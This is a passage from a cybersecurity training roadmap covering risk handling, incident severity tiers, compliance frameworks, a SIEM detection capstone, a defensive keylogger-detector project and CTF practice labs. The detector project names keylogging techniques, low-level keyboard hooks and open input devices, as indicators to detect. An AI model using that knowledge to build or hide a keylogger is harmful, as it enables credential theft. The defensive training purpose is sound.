- [ ] **Risk vs. Vulnerability:** A vulnerability without a plausible threat or material impact is **low risk**. A critical vulnerability on an internet-exposed system with known active exploitation is **critical risk**. CVSS scores measure vulnerability severity — not organizational risk. Always translate CVSS to risk by considering your environment.

- [ ] **Risk Acceptance vs. Risk Treatment:** Four options for handling identified risk:
  - **Mitigate:** Implement a control to reduce the likelihood or impact
  - **Transfer:** Shift the risk to a third party (cyber insurance, SLA contractual clauses)
  - **Accept:** Formally acknowledge the risk and decide not to act (requires executive sign-off and documentation)
  - **Avoid:** Eliminate the risk by stopping the activity that creates it

- [ ] **Risk Register Basics:** Organizations maintain a risk register — a documented list of identified risks with owner, likelihood, impact, treatment decision, and review date. As a SOC analyst, you may be asked to add or update risk register entries based on threat intelligence or incident findings.

---

**Stage G4: Incident Classification Framework**

- [ ] **Severity Classification:** Most organizations use a tiered severity system for incidents. Know a typical framework:

  | Severity | Definition | Examples | Response Time |
  |----------|-----------|---------|---------------|
  | **Critical (P1)** | Active breach, ransomware, data exfiltration in progress | Confirmed ransomware, APT intrusion, insider data theft | Immediate (< 1 hour) |
  | **High (P2)** | Likely breach or imminent risk | Malware confirmed on critical system, privileged account compromise | < 4 hours |
  | **Medium (P3)** | Potential incident requiring investigation | Suspicious login patterns, anomalous data movement, policy violation | < 24 hours |
  | **Low (P4)** | Security event unlikely to cause significant harm | Failed login attempts, policy violation without data risk | < 72 hours |

- [ ] **Incident Categories (CISA Model):** Know the standard incident categories used in government and enterprise:
  - **Category 1 — Unauthorized Access:** User accessing systems/data they shouldn't
  - **Category 2 — Denial of Service:** Deliberate disruption of availability
  - **Category 3 — Malicious Code:** Virus, worm, ransomware, rootkit
  - **Category 4 — Improper Usage:** Violation of acceptable use policy
  - **Category 5 — Scans/Probes/Attempted Access:** Reconnaissance, port scanning, brute force

- [ ] **False Positive vs. True Positive:** A **true positive** is a real attack correctly flagged by a detection rule. A **false positive** is a legitimate activity incorrectly flagged as malicious. A **false negative** is a real attack that was not detected. Tuning the ratio of true positives to false positives is the core daily work of a detection engineer.

---

**Stage G5: Compliance Framework Awareness (By Industry)**

- [ ] **Framework by Industry Quick Reference:**

  | Industry | Primary Framework | Regulator |
  |----------|------------------|-----------|
  | US Healthcare | HIPAA | HHS Office for Civil Rights |
  | Payment Processing | PCI-DSS | PCI Security Standards Council |
  | EU Data Processing | GDPR | National Data Protection Authorities |
  | US Federal Agencies | NIST SP 800-53, FedRAMP | NIST, OMB, CISA |
  | Financial Services (US) | SOX (IT controls), GLBA, FFIEC | SEC, FDIC, OCC |
  | US Defense Supply Chain | CMMC (Cybersecurity Maturity Model Certification) | DoD |
  | Indian Data Processing | DPDP Act 2023 | Data Protection Board of India |

- [ ] **What Auditors Look For (Basics):** Compliance audits typically check for: documented policies, evidence that controls are operating, access control logs, vulnerability scan results, patch management records, incident response plan existence (and evidence of testing), and security awareness training completion records. Your SIEM and incident documentation are primary audit evidence sources.

- [ ] **SOC 2 Type I vs. Type II:** SOC 2 is an auditing standard for service organizations. **Type I** evaluates whether controls are designed correctly at a point in time. **Type II** evaluates whether controls operated effectively over a period (usually 6–12 months). Customers ask for SOC 2 Type II reports to verify vendor security posture.

---

> 📌 _Full GRC depth (audit mechanics, vendor risk assessment, continuous compliance automation, FAIR risk quantification, regulatory testing procedures, ISO 27001 control implementation) is covered in [Shelf 11: GRC](Shelf_Post-Hire.md#shelf-11-governance-risk--compliance-grc) (Phase 8). This sidebar gives you the minimum needed to function effectively in a defensive role from Day 1._



---

### 🏆 Phase 3 Capstone Project

**Deploy a SIEM, Investigate Simulated Attacks, and Build a Detection Library**

- [ ] **Deploy a SIEM** (Splunk Free, ELK, or Wazuh) in your lab and ingest logs from your Phase 1 lab environment
- [ ] **Write 5 custom detection rules** (Sigma format) covering different MITRE ATT&CK tactics
- [ ] **Simulate 3 attacks** using Atomic Red Team and investigate each using only your SIEM
- [ ] **Build an investigation timeline** for each simulated incident

**Deliverables:**
- [ ] Detection coverage matrix mapping your 5 rules to MITRE ATT&CK techniques
- [ ] 3 investigation reports (timeline, evidence, root cause, recommendations)
- [ ] SIEM configuration guide (reproducible deployment steps)
- [ ] All Sigma rules and queries committed to your Git repository

> [!IMPORTANT]
> **Capstone Gate:** Your SIEM must be operational, your detection rules must fire on the simulated attacks, and your investigation reports must follow a structured IR format.

---

### 🧭 Phase 3 Reflection & Competency Check

- [ ] **Reflection:** Which detections were noisy, missing, or too fragile?
- [ ] **Reflection:** What evidence changed your initial incident hypothesis?
- [ ] **Competency:** Can you ingest logs, write rules, test them, and tune false positives?
- [ ] **Competency:** Can you build an incident timeline from multiple data sources?
- [ ] **Competency:** Can you explain detection gaps in terms of telemetry, logic, and attacker behavior?

> [!IMPORTANT]
> **Phase Completion Gate:** Move on only when you can investigate simulated attacks from evidence, improve detections, and write analyst notes that another defender can act on.

---

> [!NOTE]
> **✅ Phase 3 ends here.**
> Part 16 (Adversary Emulation & Purple Teaming) lives in [Stage 4: Enterprise](Stage-4_Enterprise.md#module-22-adversary-emulation--purple-teaming).
>
> 

---

<a id="phase-3-mini-projects"></a>

## 🛠️ Phase 3 Mini Projects

> [!TIP]
> **Why this project is here:** Phase 3 is about defense, detection, and understanding what malicious behavior looks like from the defender's perspective. The Keylogger Detector belongs here because it requires process monitoring, behavioral analysis, and understanding of OS-level keyboard hooks — all detection engineering skills. It is explicitly a defensive tool: you're detecting an attacker's technique, not performing it.

---

### Project 9 — Keylogger Detector

**Maps to:** Part 13A (Detection Engineering & SOC Operations) → Stage 2: Offensive Indicators & TTPs + Stage 5: EDR/XDR/MDR Basics

**What it is:** A host-based monitoring tool that scans running processes for behavioral indicators associated with keylogging software. Checks include: processes with suspicious names or paths, processes accessing `/dev/input/` devices (Linux) or holding `SetWindowsHookEx` hooks (Windows), processes with high keyboard I/O relative to visible UI, and processes spawned from unusual parent processes. Generates an alert report listing suspicious findings with severity and recommended action.

**What you need before building it:**
- Phase 3 Part 13A completed — you need detection engineering fundamentals before building a detector
- OS-level process enumeration: `psutil` (Python, cross-platform), `/proc/<pid>/` filesystem (Linux), WMI (Windows)
- Linux keyboard input: `/dev/input/eventX` devices — a process with a file descriptor open to a keyboard input device when it has no visible window is suspicious
- Windows hooks: `SetWindowsHookEx` with `WH_KEYBOARD_LL` is the standard keylogging API — legitimate software uses it too (accessibility tools, password managers), so allowlisting is essential
- Allowlisting: build a baseline of known-legitimate processes that access input devices (e.g., `xorg`, `gnome-shell`, screen readers)
- Understanding of false positives: every detection tool produces them — document your FP rate and tuning decisions

**Why build it:**
Keyloggers are one of the most effective and oldest credential-theft tools. Building a detector forces you to think exactly like an EDR/XDR engineer: what behavior is suspicious, what is legitimate, how do you distinguish them, and what is your false-positive tolerance? This is the same problem that CrowdStrike Falcon, SentinelOne, and Carbon Black solve at enterprise scale. Understanding it at the process level makes those tools more than black boxes to you.

It also reinforces a key Phase 3 lesson: detection is not binary. A process accessing keyboard input might be a keylogger or a screen reader. Your tool must reason about *context* — process name, parent process, network connections, user session — not just individual indicators. That contextual reasoning is threat hunting.

**Deliverable:** Python script that:
- Enumerates running processes with `psutil`
- Checks for keyboard device access (Linux: `/proc/<pid>/fd/`, Windows: `psutil.net_connections()` + WMI hook query)
- Compares against a configurable allowlist
- Outputs a structured report: `[SUSPICIOUS | INFO | CLEAN]` per process with justification

README must explain: what a keylogger hook is, why false positives are unavoidable, and what a real analyst would do next (memory forensics, network connection analysis) after this tool flags a process.

---

> [!IMPORTANT]
> **Phase 3 Project Completion Gate:** Your Keylogger Detector README must demonstrate you understand detection trade-offs — not just "run this and see." You should be able to explain a scenario where your tool generates a false positive and what the next investigative step would be.

---

> [!TIP]
> ### 🎮 Concurrent CTF Practice — Stage 3
>
> Web security is learned by doing. Every concept maps to a PortSwigger lab and an HTB/THM box. Do them as you study each topic, not after.
>
> | Module | Platform | Lab / Box | Why |
> |---|---|---|---|
> | 14–16 Web Vulns | [PortSwigger Web Security Academy](https://portswigger.net/web-security) | All **Apprentice** labs across SQLi, XSS, CSRF, SSRF, XXE, IDOR, Path Traversal | Covers every OWASP Top 10 item hands-on |
> | 14–16 Web Vulns | HackTheBox | **Unified** · **Markup** · **Vaccine** (Starting Point) | SQLi, XXE, SSTI in real web apps |
> | 14–16 Web Vulns | TryHackMe | **OWASP Top 10** room · **OWASP Juice Shop** | Guided walkthrough of all 10 classes |
> | 17 API Security | [HackTheBox Labs](https://app.hackthebox.com) | **Postman** · **BookWorm** | REST and GraphQL API attacks |
> | 17 API Security | [DVWA](https://dvwa.co.uk) / [crAPI](https://github.com/OWASP/crAPI) | Deploy locally and work through all labs | Dedicated API vulnerability practice |
> | 18 Bug Bounty | [PentesterLab](https://pentesterlab.com) | White Badge + Green Badge exercises | Bug class recognition in real code |
> | 18 Bug Bounty | [HackerOne](https://www.hackerone.com) / [Bugcrowd](https://www.bugcrowd.com) | Join 1 public program and submit 1 report | Real-world recon + reporting practice |
>
> **Rule:** For every PortSwigger lab you complete, write one paragraph explaining the root cause, not just the steps.

<a id="stage-gate-2"></a>

## 🏁 Stage Gate 2 — Web Application Security Gate

> [!IMPORTANT]
> **Stage 2 Exit Gate:** Before moving to Enterprise Infrastructure (Stage 4), you must demonstrate:
> - 3+ detailed PortSwigger Web Security Academy practitioner lab completions across SQLi, SSRF, and JWT.
> - 1 unassisted web-focused machine rooted on Hack The Box / Proving Grounds.
> - Demonstrated ability to intercept, decode, tamper, and exploit API logic flaws cold in Burp Suite.
